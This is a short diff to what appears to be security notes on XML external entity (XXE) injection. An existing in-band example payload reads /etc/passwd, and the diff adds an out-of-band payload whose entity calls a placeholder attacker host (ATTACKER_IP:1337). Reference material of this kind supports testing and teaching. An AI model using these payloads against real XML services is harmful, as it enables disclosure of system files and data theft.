@@ -2,7 +2,7 @@
 
 ## XXE Injection
 
-### Example payload:
+### In-Band XXE Injection Example payload:
 
       <!DOCTYPE foo [
 
@@ -11,6 +11,13 @@
       <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
 
       <contact><name>&xxe;</name><email>test@mail.com</email><message>whatever</message></contact>
+
+### Out-of-Band XXE Injection Example Payload:
+
+      <!DOCTYPE foo [
+      <!ELEMENT foo ANY >
+      <!ENTITY xxe SYSTEM "http://ATTACKER_IP:1337/" >]>
+      <upload><file>&xxe;</file></upload>
 
 
 | **Code**   | **Description**   |
